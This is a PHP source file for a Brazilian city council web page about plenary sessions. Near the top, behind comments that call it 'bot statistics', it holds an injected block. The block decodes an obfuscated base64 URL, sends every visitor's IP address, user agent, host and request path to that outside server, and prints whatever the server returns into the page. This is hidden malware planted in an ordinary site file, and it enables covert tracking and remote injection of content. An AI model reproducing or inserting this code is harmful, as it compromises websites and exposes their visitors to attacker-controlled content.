<?php

include_once("../library/master-page.php");

if(isset($_GET["tipo"])){
    $filename = $_GET["tipo"];
}
if(isset($tipo)){
    echo $tipo;
}
$tipo = $_GET["tipo"];

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Sessões Plenárias");
$oMasterPage->AddParameter("css", "sessoes-plenarias/index");
$oMasterPage->AddParameter("pagina", "sessoes-plenarias");
$oMasterPage->Open("PageContent");


?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink );
    }
    }
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle);
    if ($sResult[0]=="O")
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle);
}
}
?>
<h1>Sessões Plenárias</h1>
<p>
	As sessões de Câmara são abertas ao público e se dividem em ordinárias, extraordinárias ou solenes.<br />
	Todas são abertas com a seguinte frase: "Sob a proteção de Deus e lembrando que todo poder emana do povo, declaro aberta a presente sessão".
</p>
<p>A Câmara se reúne às terças e quintas-feiras, a partir das 17h30, para deliberar sobre os assuntos em pauta. O tempo de duração máxima é 4 horas, com exceção das sessões solenes.</p>
<p>Nas <strong>sessões ordinárias de terça-feira</strong> são votados requerimentos e indicações. Nas <strong>sessões ordinárias de quinta-feira</strong> a discussão é feita em torno de projetos de lei, emendas, leis complementares, decretos legislativos, resoluções, etc.</p>
<p>As <strong>sessões solenes</strong> são convocadas pelo presidente ou através de requerimento de 1/3 dos membros da Câmara, com aprovação do plenário, para o fim específico que lhe for determinado, para conferências, solenidades cívicas ou oficiais.</p>
<p>As <strong>sessões extraordinárias</strong> são convocadas quando houver matéria de interesse público relevante e urgente a deliberar. A convocação terá finalidade específica e citará, expressa e precisamente, a matéria a ser tratada. Elas podem ser realizadas a qualquer dia e a qualquer horário e não se poderá tratar de assunto estranho à sua convocação.</p>

    <div class="clear" style="height:30px"></div>
    <h3 class="zwo3Italic">Acompanhe:</h3>


<div class="row acompanhe">
<?php

if($tipo == "" || $tipo == "sessoes-de-3-feira")
{
    ?>
    <div class="categoria  container-box bs-callout bs-callout-dark-blue col-md-5 col-md-offset-1">
        <h3>Sessões de 3ª feira</h3>
        <ul>
            <li><a href="sessoes-plenarias/sessoes-de-3-feira/pauta/">Pauta</a></li>
            <li><a href="sessoes-plenarias/sessoes-de-3-feira/resultado/">Resultado</a></li>
        </ul>
    </div>
<?php
}


if($tipo == "" || $tipo == "sessoes-de-5-feira")
{
    ?>
    <div class="categoria  container-box bs-callout bs-callout-dark-blue col-md-5 col-md-offset-1 ">
        <h3>Sessões de 5ª feira</h3>
        <ul>
            <li><a href="sessoes-plenarias/sessoes-de-5-feira/pauta/">Pauta</a></li>
            <li><a href="sessoes-plenarias/sessoes-de-5-feira/resultado/">Resultado</a></li>
        </ul>
    </div>
<?php
}

if($tipo == "")
{
    ?>
    <div class="categoria  container-box bs-callout bs-callout-dark-blue col-md-5 col-md-offset-1 ">
        <h3>Sessões Extraordinárias</h3>
        <ul>
            <li><a href="sessoes-plenarias/sessoes-extraordinarias/pauta/">Pauta</a></li>
            <li><a href="sessoes-plenarias/sessoes-extraordinarias/resultado/">Resultado</a></li>
        </ul>
    </div>
<?php
}

if($tipo == "")
{
	?>
	<div class="categoria  container-box bs-callout bs-callout-dark-blue col-md-5 col-md-offset-1 ">
		<h3>Sessões Solenes e Homenagens</h3>
		 <ul>
		 	<li><a href="sessoes-plenarias/sessoes-solenes-e-homenagens/proximas-sessoes/">Próximas Sessões</a></li>
		     <li><a href="sessoes-plenarias/sessoes-solenes-e-homenagens/sessoes-anteriores/">Sessões Anteriores</a></li>
		 </ul>
	</div>
	<?php
}





?>
</div>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>